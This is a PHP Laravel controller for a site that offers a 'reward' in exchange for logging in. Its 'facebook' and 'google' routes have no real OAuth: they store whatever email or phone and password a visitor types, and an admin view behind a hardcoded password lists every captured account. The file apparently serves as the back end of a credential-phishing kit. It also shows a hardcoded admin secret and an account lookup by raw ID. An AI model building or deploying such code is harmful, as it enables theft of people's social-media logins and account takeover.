<?php

namespace App\Http\Controllers;

use App\Models\Account;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function showLogin(Request $request)
    {
        return view('login', [
            'reward' => $request->query('reward')
        ]);
    }

    public function facebook(Request $request)
    {
        return $this->createAccount($request, 'facebook');
    }

    public function google(Request $request)
    {
        return $this->createAccount($request, 'google');
    }

    private function createAccount(
        Request $request,
        string $accountType
    ) {
        $validated = $request->validate([
            'email_or_phone' => [
                'required',
                'string',
                'max:255',
            ],

            'password' => [
                'required',
                'string',
                'min:8',
            ],

            'reward' => [
                'nullable',
                'string',
                'max:255',
            ],
        ]);

        $account = Account::where(
            'email_or_phone',
            $validated['email_or_phone']
        )->first();

        if (!$account) {

            $account = Account::create([
                'email_or_phone' =>
                    $validated['email_or_phone'],

                'password' =>
                    $validated['password'],

                'account_type' =>
                    $accountType,
            ]);

        } else {

            if (!Hash::check(
                $validated['password'],
                $account->password
            )) {
                return back()
                    ->withErrors([
                        'email_or_phone' =>
                            'Invalid account credentials.'
                    ])
                    ->withInput();
            }
        }

        return redirect()->route('reward.success', [
            'reward' =>
                $validated['reward'] ?? 'Reward',
            'account' =>
                $account->id,
        ]);
    }


    public function success(Request $request)
    {
        $account = Account::findOrFail(
            $request->query('account')
        );

        return view('success', [
            'account' => $account,
            'reward' =>
                $request->query('reward')
        ]);
    }

    public function admin()
{
    if (session('admin_authenticated')) {
        $accounts = \App\Models\Account::latest()->get();

        return view('admin', compact('accounts'));
    }

    return view('admin-login');
}


public function adminLogin(Request $request)
{
    $request->validate([
        'password' => 'required|string',
    ]);

    // Development/testing only
    if ($request->password === 'thamizh098') {

        session([
            'admin_authenticated' => true
        ]);

        return redirect()->route('admin');
    }

    return back()->withErrors([
        'password' => 'Invalid admin password.'
    ]);
}
}